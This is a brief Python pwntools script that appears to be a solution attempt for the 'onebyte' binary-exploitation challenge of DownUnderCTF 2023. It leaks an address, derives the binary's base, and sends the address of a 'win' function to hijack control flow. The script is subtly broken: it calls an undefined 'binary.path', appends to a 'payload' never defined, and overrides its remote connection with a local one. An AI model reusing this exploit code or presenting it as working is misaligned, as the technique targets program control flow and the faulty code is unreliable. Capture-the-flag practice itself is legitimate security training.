from pwn import *

elf = context.binary = ELF('./onebyte')
if not args.REMOTE:
	p = process(binary.path)
else:
	p = remote('2023.ductf.dev', 30018)

p = process()
p.recvuntil('Free junk: ')
init = int(p.recvline(), 16)
p.recvuntil('Your turn: ')
print(init)
elf.address = init - elf.sym['init']
payload += p32(elf.sym['win'])
p.sendline(payload)
print(p.clean().decode('latin-1'))
